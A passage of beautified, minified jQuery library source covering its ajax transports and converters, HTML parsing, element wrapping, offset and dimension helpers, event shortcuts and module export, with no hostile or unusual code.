        return this.name && !new b.fn.init(this, undefined).is(":disabled") && tv.test(this.nodeName) && !tg.test(e) && (this.checked || !ed.test(e));
      }).map(function (e, t) {
        var n = new b.fn.init(this, undefined).val();
        return null == n ? null : Array.isArray(n) ? b.map(n, function (e) {
          return {
            name: t.name,
            value: e.replace(th, "\r\n")
          };
        }) : {
          name: t.name,
          value: n.replace(th, "\r\n")
        };
      }).get();
    }
  });
  var ty = /%20/g;
  var t$ = /#.*$/;
  var tx = /([?&])_=[^&]*/;
  var tb = /^(.*?):[ \t]*([^\r\n]*)$/gm;
  var t_ = /^(?:GET|HEAD)$/;
  var tT = /^\/\//;
  var tw = {};
  var tC = {};
  var tk = "*/".concat("*");
  var tS = v.createElement("a");
  function tE(e) {
    return function (t, n) {
      if ("string" != typeof t) {
        n = t;
        t = "*";
      }
      var r;
      var i = 0;
      var o = t.toLowerCase().match(H) || [];
      if ("function" == typeof n && "number" != typeof n.nodeType && "function" != typeof n.item) {
        for (; r = o[i++];) {
          if ("+" === r[0]) {
            (e[r = r.slice(1) || "*"] = e[r] || []).unshift(n);
          } else {
            (e[r] = e[r] || []).push(n);
          }
        }
      }
    };
  }
  function tN(e, t, n, r) {
    var i = {};
    var o = e === tC;
    function a(s) {
      var u;
      i[s] = true;
      b.each(e[s] || [], function (e, s) {
        var l = s(t, n, r);
        return "string" != typeof l || o || i[l] ? o ? !(u = l) : undefined : (t.dataTypes.unshift(l), a(l), false);
      });
      return u;
    }
    return a(t.dataTypes[0]) || !i["*"] && a("*");
  }
  function tA(e, t) {
    var n;
    var r;
    var i = b.ajaxSettings.flatOptions || {};
    for (n in t) if (undefined !== t[n]) {
      (i[n] ? e : r || (r = {}))[n] = t[n];
    }
    if (r) {
      b.extend(true, e, r);
    }
    return e;
  }
  tS.href = tc.href;
  b.extend({
    active: 0,
    lastModified: {},
    etag: {},
    ajaxSettings: {
      url: tc.href,
      type: "GET",
      isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(tc.protocol),
      global: true,
      processData: true,
      async: true,
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      accepts: {
        "*": tk,
        text: "text/plain",
        html: "text/html",
        xml: "application/xml, text/xml",
        json: "application/json, text/javascript"
      },
      contents: {
        xml: /\bxml\b/,
        html: /\bhtml/,
        json: /\bjson\b/
      },
      responseFields: {
        xml: "responseXML",
        text: "responseText",
        json: "responseJSON"
      },
      converters: {
        "* text": String,
        "text html": true,
        "text json": JSON.parse,
        "text xml": b.parseXML
      },
      flatOptions: {
        url: true,
        context: true
      }
    },
    ajaxSetup: function (e, t) {
      return t ? tA(tA(e, b.ajaxSettings), t) : tA(b.ajaxSettings, e);
    },
    ajaxPrefilter: tE(tw),
    ajaxTransport: tE(tC),
    ajax: function (t, n) {
      if ("object" == typeof t) {
        n = t;
        t = undefined;
      }
      n = n || {};
      var r;
      var i;
      var o;
      var a;
      var s;
      var u;
      var l;
      var c;
      var f;
      var p;
      var d = b.ajaxSetup({}, n);
      var h = d.context || d;
      var g = d.context && (h.nodeType || h.jquery) ? new b.fn.init(h, undefined) : b.event;
      var m = b.Deferred();
      var y = b.Callbacks("once memory");
      var x = d.statusCode || {};
      var _ = {};
      var T = {};
      var w = "canceled";
      var C = {
        readyState: 0,
        getResponseHeader: function (e) {
          var t;
          if (l) {
            if (!a) {
              for (a = {}; t = tb.exec(o);) {
                a[t[1].toLowerCase() + " "] = (a[t[1].toLowerCase() + " "] || []).concat(t[2]);
              }
            }
            t = a[e.toLowerCase() + " "];
          }
          return null == t ? null : t.join(", ");
        },
        getAllResponseHeaders: function () {
          return l ? o : null;
        },
        setRequestHeader: function (e, t) {
          if (null == l) {
            _[e = T[e.toLowerCase()] = T[e.toLowerCase()] || e] = t;
          }
          return this;
        },
        overrideMimeType: function (e) {
          if (null == l) {
            d.mimeType = e;
          }
          return this;
        },
        statusCode: function (e) {
          var t;
          if (e) {
            if (l) {
              C.always(e[C.status]);
            } else {
              for (t in e) x[t] = [x[t], e[t]];
            }
          }
          return this;
        },
        abort: function (e) {
          var t = e || w;
          if (r) {
            r.abort(t);
          }
          E(0, t);
          return this;
        }
      };
      m.promise(C);
      d.url = ((t || d.url || tc.href) + "").replace(tT, tc.protocol + "//");
      d.type = n.method || n.type || d.method || d.type;
      d.dataTypes = (d.dataType || "*").toLowerCase().match(H) || [""];
      if (null == d.crossDomain) {
        u = v.createElement("a");
        try {
          u.href = d.url;
          u.href = u.href;
          d.crossDomain = tS.protocol + "//" + tS.host != u.protocol + "//" + u.host;
        } catch (k) {
          d.crossDomain = true;
        }
      }
      if (d.data && d.processData && "string" != typeof d.data) {
        d.data = b.param(d.data, d.traditional);
      }
      tN(tw, d, n, C);
      if (l) {
        return C;
      }
      if ((c = b.event && d.global) && 0 == b.active++) {
        b.event.trigger("ajaxStart");
      }
      d.type = d.type.toUpperCase();
      d.hasContent = !t_.test(d.type);
      i = d.url.replace(t$, "");
      if (d.hasContent) {
        if (d.data && d.processData && 0 === (d.contentType || "").indexOf("application/x-www-form-urlencoded")) {
          d.data = d.data.replace(ty, "+");
        }
      } else {
        p = d.url.slice(i.length);
        if (d.data && (d.processData || "string" == typeof d.data)) {
          i += (tp.test(i) ? "&" : "?") + d.data;
          delete d.data;
        }
        if (false === d.cache) {
          i = i.replace(tx, "$1");
          p = (tp.test(i) ? "&" : "?") + "_=" + tf.guid++ + p;
        }
        d.url = i + p;
      }
      if (d.ifModified) {
        if (b.lastModified[i]) {
          C.setRequestHeader("If-Modified-Since", b.lastModified[i]);
        }
        if (b.etag[i]) {
          C.setRequestHeader("If-None-Match", b.etag[i]);
        }
      }
      if (d.data && d.hasContent && false !== d.contentType || n.contentType) {
        C.setRequestHeader("Content-Type", d.contentType);
      }
      C.setRequestHeader("Accept", d.dataTypes[0] && d.accepts[d.dataTypes[0]] ? d.accepts[d.dataTypes[0]] + ("*" !== d.dataTypes[0] ? ", " + tk + "; q=0.01" : "") : d.accepts["*"]);
      for (f in d.headers) C.setRequestHeader(f, d.headers[f]);
      if (d.beforeSend && (false === d.beforeSend.call(h, C, d) || l)) {
        return C.abort();
      }
      w = "abort";
      y.add(d.complete);
      C.done(d.success);
      C.fail(d.error);
      if (r = tN(tC, d, n, C)) {
        C.readyState = 1;
        if (c) {
          g.trigger("ajaxSend", [C, d]);
        }
        if (l) {
          return C;
        }
        if (d.async && d.timeout > 0) {
          s = e.setTimeout(function () {
            C.abort("timeout");
          }, d.timeout);
        }
        try {
          l = false;
          r.send(_, E);
        } catch (S) {
          if (l) {
            throw S;
          }
          E(-1, S);
        }
      } else {
        E(-1, "No Transport");
      }
      function E(t, n, a, u) {
        var f;
        var p;
        var v;
        var _;
        var T;
        var w = n;
        if (!l) {
          l = true;
          if (s) {
            e.clearTimeout(s);
          }
          r = undefined;
          o = u || "";
          C.readyState = t > 0 ? 4 : 0;
          f = t >= 200 && t < 300 || 304 === t;
          if (a) {
            _ = function (e, t, n) {
              var r;
              var i;
              var o;
              var a;
              var s = e.contents;
              for (var u = e.dataTypes; "*" === u[0];) {
                u.shift();
                if (undefined === r) {
                  r = e.mimeType || t.getResponseHeader("Content-Type");
                }
              }
              if (r) {
                for (i in s) if (s[i] && s[i].test(r)) {
                  u.unshift(i);
                  break;
                }
              }
              if (u[0] in n) {
                o = u[0];
              } else {
                for (i in n) {
                  if (!u[0] || e.converters[i + " " + u[0]]) {
                    o = i;
                    break;
                  }
                  if (!a) {
                    a = i;
                  }
                }
                o = o || a;
              }
              if (o) {
                if (o !== u[0]) {
                  u.unshift(o);
                }
                return n[o];
              }
            }(d, C, a);
          }
          if (!f && b.inArray("script", d.dataTypes) > -1 && 0 > b.inArray("json", d.dataTypes)) {
            d.converters["text script"] = function () {};
          }
          _ = function (e, t, n, r) {
            var i;
            var o;
            var a;
            var s;
            var u;
            var l = {};
            var c = e.dataTypes.slice();
            if (c[1]) {
              for (a in e.converters) l[a.toLowerCase()] = e.converters[a];
            }
            for (o = c.shift(); o;) {
              if (e.responseFields[o]) {
                n[e.responseFields[o]] = t;
              }
              if (!u && r && e.dataFilter) {
                t = e.dataFilter(t, e.dataType);
              }
              u = o;
              if (o = c.shift()) {
                if ("*" === o) {
                  o = u;
                } else if ("*" !== u && u !== o) {
                  if (!(a = l[u + " " + o] || l["* " + o])) {
                    for (i in l) if ((s = i.split(" "))[1] === o && (a = l[u + " " + s[0]] || l["* " + s[0]])) {
                      if (true === a) {
                        a = l[i];
                      } else if (true !== l[i]) {
                        o = s[0];
                        c.unshift(s[1]);
                      }
                      break;
                    }
                  }
                  if (true !== a) {
                    if (a && e.throws) {
                      t = a(t);
                    } else {
                      try {
                        t = a(t);
                      } catch (f) {
                        return {
                          state: "parsererror",
                          error: a ? f : "No conversion from " + u + " to " + o
                        };
                      }
                    }
                  }
                }
              }
            }
            return {
              state: "success",
              data: t
            };
          }(d, _, C, f);
          if (f) {
            if (d.ifModified) {
              if (T = C.getResponseHeader("Last-Modified")) {
                b.lastModified[i] = T;
              }
              if (T = C.getResponseHeader("etag")) {
                b.etag[i] = T;
              }
            }
            if (204 === t || "HEAD" === d.type) {
              w = "nocontent";
            } else if (304 === t) {
              w = "notmodified";
            } else {
              w = _.state;
              p = _.data;
              f = !(v = _.error);
            }
          } else {
            v = w;
            if (!(!t && w)) {
              w = "error";
              if (t < 0) {
                t = 0;
              }
            }
          }
          C.status = t;
          C.statusText = (n || w) + "";
          if (f) {
            m.resolveWith(h, [p, w, C]);
          } else {
            m.rejectWith(h, [C, w, v]);
          }
          C.statusCode(x);
          x = undefined;
          if (c) {
            g.trigger(f ? "ajaxSuccess" : "ajaxError", [C, d, f ? p : v]);
          }
          y.fireWith(h, [C, w]);
          if (c) {
            g.trigger("ajaxComplete", [C, d]);
            if (! --b.active) {
              b.event.trigger("ajaxStop");
            }
          }
        }
      }
      return C;
    },
    getJSON: function (e, t, n) {
      return b.get(e, t, n, "json");
    },
    getScript: function (e, t) {
      return b.get(e, undefined, t, "script");
    }
  });
  b.each(["get", "post"], function (e, t) {
    b[t] = function (e, n, r, i) {
      if ("function" == typeof n && "number" != typeof n.nodeType && "function" != typeof n.item) {
        i = i || r;
        r = n;
        n = undefined;
      }
      return b.ajax(b.extend({
        url: e,
        type: t,
        dataType: i,
        data: n,
        success: r
      }, b.isPlainObject(e) && e));
    };
  });
  b.ajaxPrefilter(function (e) {
    var t;
    for (t in e.headers) if ("content-type" === t.toLowerCase()) {
      e.contentType = e.headers[t] || "";
    }
  });
  b._evalUrl = function (e, t, n) {
    return b.ajax({
      url: e,
      type: "GET",
      dataType: "script",
      cache: true,
      async: false,
      global: false,
      converters: {
        "text script": function () {}
      },
      dataFilter: function (e) {
        b.globalEval(e, t, n);
      }
    });
  };
  b.fn.extend({
    wrapAll: function (e) {
      var t;
      if (this[0]) {
        if ("function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item) {
          e = e.call(this[0]);
        }
        t = new b.fn.init(e, this[0].ownerDocument).eq(0).clone(true);
        if (this[0].parentNode) {
          t.insertBefore(this[0]);
        }
        t.map(function () {
          for (var e = this; e.firstElementChild;) {
            e = e.firstElementChild;
          }
          return e;
        }).append(this);
      }
      return this;
    },
    wrapInner: function (e) {
      return "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item ? this.each(function (t) {
        new b.fn.init(this, undefined).wrapInner(e.call(this, t));
      }) : this.each(function () {
        var t = new b.fn.init(this, undefined);
        var n = t.contents();
        if (n.length) {
          n.wrapAll(e);
        } else {
          t.append(e);
        }
      });
    },
    wrap: function (e) {
      var t = "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item;
      return this.each(function (n) {
        new b.fn.init(this, undefined).wrapAll(t ? e.call(this, n) : e);
      });
    },
    unwrap: function (e) {
      this.parent(e).not("body").each(function () {
        new b.fn.init(this, undefined).replaceWith(this.childNodes);
      });
      return this;
    }
  });
  b.expr.pseudos.hidden = function (e) {
    return !b.expr.pseudos.visible(e);
  };
  b.expr.pseudos.visible = function (e) {
    return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length);
  };
  b.ajaxSettings.xhr = function () {
    try {
      return new e.XMLHttpRequest();
    } catch (t) {}
  };
  var tD = {
    0: 200,
    1223: 204
  };
  var tj = b.ajaxSettings.xhr();
  d.cors = !!tj && "withCredentials" in tj;
  d.ajax = tj = !!tj;
  b.ajaxTransport(function (t) {
    var n;
    var r;
    if (d.cors || tj && !t.crossDomain) {
      return {
        send: function (i, o) {
          var a;
          var s = t.xhr();
          s.open(t.type, t.url, t.async, t.username, t.password);
          if (t.xhrFields) {
            for (a in t.xhrFields) s[a] = t.xhrFields[a];
          }
          if (t.mimeType && s.overrideMimeType) {
            s.overrideMimeType(t.mimeType);
          }
          if (!(t.crossDomain || i["X-Requested-With"])) {
            i["X-Requested-With"] = "XMLHttpRequest";
          }
          for (a in i) s.setRequestHeader(a, i[a]);
          n = function (e) {
            return function () {
              if (n) {
                n = r = s.onload = s.onerror = s.onabort = s.ontimeout = s.onreadystatechange = null;
                if ("abort" === e) {
                  s.abort();
                } else if ("error" === e) {
                  if ("number" != typeof s.status) {
                    o(0, "error");
                  } else {
                    o(s.status, s.statusText);
                  }
                } else {
                  o(tD[s.status] || s.status, s.statusText, "text" !== (s.responseType || "text") || "string" != typeof s.responseText ? {
                    binary: s.response
                  } : {
                    text: s.responseText
                  }, s.getAllResponseHeaders());
                }
              }
            };
          };
          s.onload = n();
          r = s.onerror = s.ontimeout = n("error");
          if (undefined !== s.onabort) {
            s.onabort = r;
          } else {
            s.onreadystatechange = function () {
              if (4 === s.readyState) {
                e.setTimeout(function () {
                  if (n) {
                    r();
                  }
                });
              }
            };
          }
          n = n("abort");
          try {
            s.send(t.hasContent && t.data || null);
          } catch (u) {
            if (n) {
              throw u;
            }
          }
        },
        abort: function () {
          if (n) {
            n();
          }
        }
      };
    }
  });
  b.ajaxPrefilter(function (e) {
    if (e.crossDomain) {
      e.contents.script = false;
    }
  });
  b.ajaxSetup({
    accepts: {
      script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
    },
    contents: {
      script: /\b(?:java|ecma)script\b/
    },
    converters: {
      "text script": function (e) {
        b.globalEval(e);
        return e;
      }
    }
  });
  b.ajaxPrefilter("script", function (e) {
    if (undefined === e.cache) {
      e.cache = false;
    }
    if (e.crossDomain) {
      e.type = "GET";
    }
  });
  b.ajaxTransport("script", function (e) {
    var t;
    var n;
    if (e.crossDomain || e.scriptAttrs) {
      return {
        send: function (r, i) {
          t = new b.fn.init("<script>", undefined).attr(e.scriptAttrs || {}).prop({
            charset: e.scriptCharset,
            src: e.url
          }).on("load error", n = function (e) {
            t.remove();
            n = null;
            if (e) {
              i("error" === e.type ? 404 : 200, e.type);
            }
          });
          v.head.appendChild(t[0]);
        },
        abort: function () {
          if (n) {
            n();
          }
        }
      };
    }
  });
  var tq;
  var tL = [];
  var tH = /(=)\?(?=&|$)|\?\?/;
  b.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var e = tL.pop() || b.expando + "_" + tf.guid++;
      this[e] = true;
      return e;
    }
  });
  b.ajaxPrefilter("json jsonp", function (t, n, r) {
    var i;
    var o;
    var a;
    var s = false !== t.jsonp && (tH.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && tH.test(t.data) && "data");
    if (s || "jsonp" === t.dataTypes[0]) {
      i = t.jsonpCallback = "function" == typeof t.jsonpCallback && "number" != typeof t.jsonpCallback.nodeType && "function" != typeof t.jsonpCallback.item ? t.jsonpCallback() : t.jsonpCallback;
      if (s) {
        t[s] = t[s].replace(tH, "$1" + i);
      } else if (false !== t.jsonp) {
        t.url += (tp.test(t.url) ? "&" : "?") + t.jsonp + "=" + i;
      }
      t.converters["script json"] = function () {
        if (!a) {
          b.error(i + " was not called");
        }
        return a[0];
      };
      t.dataTypes[0] = "json";
      o = e[i];
      e[i] = function () {
        a = arguments;
      };
      r.always(function () {
        if (undefined === o) {
          new b.fn.init(e, undefined).removeProp(i);
        } else {
          e[i] = o;
        }
        if (t[i]) {
          t.jsonpCallback = n.jsonpCallback;
          tL.push(i);
        }
        if (a && "function" == typeof o && "number" != typeof o.nodeType && "function" != typeof o.item) {
          o(a[0]);
        }
        a = o = undefined;
      });
      return "script";
    }
  });
  (tq = v.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>";
  d.createHTMLDocument = 2 === tq.childNodes.length;
  b.parseHTML = function (e, t, n) {
    var r;
    var i;
    var o;
    return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = false), t || (d.createHTMLDocument ? ((r = (t = v.implementation.createHTMLDocument("")).createElement("base")).href = v.location.href, t.head.appendChild(r)) : t = v), o = !n && [], (i = E.exec(e)) ? [t.createElement(i[1])] : (i = ex([e], t, o), o && o.length && new b.fn.init(o, undefined).remove(), b.merge([], i.childNodes)));
  };
  b.fn.load = function (e, t, n) {
    var r;
    var i;
    var o;
    var a = this;
    var s = e.indexOf(" ");
    if (s > -1) {
      r = (e.slice(s).match(H) || []).join(" ");
      e = e.slice(0, s);
    }
    if ("function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item) {
      n = t;
      t = undefined;
    } else if (t && "object" == typeof t) {
      i = "POST";
    }
    if (a.length > 0) {
      b.ajax({
        url: e,
        type: i || "GET",
        dataType: "html",
        data: t
      }).done(function (e) {
        o = arguments;
        a.html(r ? new b.fn.init("<div>", undefined).append(b.parseHTML(e)).find(r) : e);
      }).always(n && function (e, t) {
        a.each(function () {
          n.apply(this, o || [e.responseText, t, e]);
        });
      });
    }
    return this;
  };
  b.expr.pseudos.animated = function (e) {
    return b.grep(b.timers, function (t) {
      return e === t.elem;
    }).length;
  };
  b.offset = {
    setOffset: function (e, t, n) {
      var r;
      var i;
      var o;
      var a;
      var s;
      var u;
      var l = b.css(e, "position");
      var c = new b.fn.init(e, undefined);
      var f = {};
      if ("static" === l) {
        e.style.position = "relative";
      }
      s = c.offset();
      o = b.css(e, "top");
      u = b.css(e, "left");
      if (("absolute" === l || "fixed" === l) && (o + u).indexOf("auto") > -1) {
        a = (r = c.position()).top;
        i = r.left;
      } else {
        a = parseFloat(o) || 0;
        i = parseFloat(u) || 0;
      }
      if ("function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item) {
        t = t.call(e, n, b.extend({}, s));
      }
      if (null != t.top) {
        f.top = t.top - s.top + a;
      }
      if (null != t.left) {
        f.left = t.left - s.left + i;
      }
      if ("using" in t) {
        t.using.call(e, f);
      } else {
        c.css(f);
      }
    }
  };
  b.fn.extend({
    offset: function (e) {
      if (arguments.length) {
        return undefined === e ? this : this.each(function (t) {
          b.offset.setOffset(this, e, t);
        });
      }
      var t;
      var n;
      var r = this[0];
      return r ? r.getClientRects().length ? (t = r.getBoundingClientRect(), n = r.ownerDocument.defaultView, {
        top: t.top + n.pageYOffset,
        left: t.left + n.pageXOffset
      }) : {
        top: 0,
        left: 0
      } : undefined;
    },
    position: function () {
      if (this[0]) {
        var e;
        var t;
        var n;
        var r = this[0];
        var i = {
          top: 0,
          left: 0
        };
        if ("fixed" === b.css(r, "position")) {
          t = r.getBoundingClientRect();
        } else {
          t = this.offset();
          n = r.ownerDocument;
          for (e = r.offsetParent || n.documentElement; e && (e === n.body || e === n.documentElement) && "static" === b.css(e, "position");) {
            e = e.parentNode;
          }
          if (e && e !== r && 1 === e.nodeType) {
            (i = new b.fn.init(e, undefined).offset()).top += b.css(e, "borderTopWidth", true);
            i.left += b.css(e, "borderLeftWidth", true);
          }
        }
        return {
          top: t.top - i.top - b.css(r, "marginTop", true),
          left: t.left - i.left - b.css(r, "marginLeft", true)
        };
      }
    },
    offsetParent: function () {
      return this.map(function () {
        for (var e = this.offsetParent; e && "static" === b.css(e, "position");) {
          e = e.offsetParent;
        }
        return e || er;
      });
    }
  });
  b.each({
    scrollLeft: "pageXOffset",
    scrollTop: "pageYOffset"
  }, function (e, t) {
    var n = "pageYOffset" === t;
    b.fn[e] = function (r) {
      return R(this, function (e, r, i) {
        var o;
        if (null != e && e === e.window) {
          o = e;
        } else if (9 === e.nodeType) {
          o = e.defaultView;
        }
        if (undefined === i) {
          return o ? o[t] : e[r];
        }
        if (o) {
          o.scrollTo(n ? o.pageXOffset : i, n ? i : o.pageYOffset);
        } else {
          e[r] = i;
        }
      }, e, r, arguments.length);
    };
  });
  b.each(["top", "left"], function (e, t) {
    b.cssHooks[t] = eW(d.pixelPosition, function (e, n) {
      if (n) {
        n = eM(e, t);
        return eP.test(n) ? new b.fn.init(e, undefined).position()[t] + "px" : n;
      }
    });
  });
  b.each({
    Height: "height",
    Width: "width"
  }, function (e, t) {
    b.each({
      padding: "inner" + e,
      content: t,
      "": "outer" + e
    }, function (n, r) {
      b.fn[r] = function (i, o) {
        var a = arguments.length && (n || "boolean" != typeof i);
        var s = n || (true === i || true === o ? "margin" : "border");
        return R(this, function (t, n, i) {
          var o;
          return null != t && t === t.window ? 0 === r.indexOf("outer") ? t["inner" + e] : t.document.documentElement["client" + e] : 9 === t.nodeType ? (o = t.documentElement, Math.max(t.body["scroll" + e], o["scroll" + e], t.body["offset" + e], o["offset" + e], o["client" + e])) : undefined === i ? b.css(t, n, s) : b.style(t, n, i, s);
        }, t, a ? i : undefined, a);
      };
    });
  });
  b.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (e, t) {
    b.fn[t] = function (e) {
      return this.on(t, e);
    };
  });
  b.fn.extend({
    bind: function (e, t, n) {
      return this.on(e, null, t, n);
    },
    unbind: function (e, t) {
      return this.off(e, null, t);
    },
    delegate: function (e, t, n, r) {
      return this.on(t, e, n, r);
    },
    undelegate: function (e, t, n) {
      return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n);
    },
    hover: function (e, t) {
      return this.mouseenter(e).mouseleave(t || e);
    }
  });
  b.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (e, t) {
    b.fn[t] = function (e, n) {
      return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t);
    };
  });
  var tP = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
  b.proxy = function (e, t) {
    var n;
    var r;
    var o;
    if ("string" == typeof t) {
      n = e[t];
      t = e;
      e = n;
    }
    if ("function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item) {
      r = i.call(arguments, 2);
      (o = function () {
        return e.apply(t || this, r.concat(i.call(arguments)));
      }).guid = e.guid = e.guid || b.guid++;
      return o;
    }
  };
  b.holdReady = function (e) {
    if (e) {
      b.readyWait++;
    } else {
      b.ready(true);
    }
  };
  b.isArray = Array.isArray;
  b.parseJSON = JSON.parse;
  b.nodeName = S;
  b.isFunction = h;
  b.isWindow = g;
  b.camelCase = U;
  b.type = x;
  b.now = Date.now;
  b.isNumeric = function (e) {
    var t = b.type(e);
    return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e));
  };
  b.trim = function (e) {
    return null == e ? "" : (e + "").replace(tP, "");
  };
  if ("function" == typeof define && define.amd) {
    define("jquery", [], function () {
      return b;
    });
  }
  var tO = e.jQuery;
  var t0 = e.$;
  b.noConflict = function (t) {
    if (e.$ === b) {
      e.$ = t0;
    }
    if (t && e.jQuery === b) {
      e.jQuery = tO;
    }
    return b;
  };
  if (undefined === t) {
    e.jQuery = e.$ = b;
  }
  return b;
});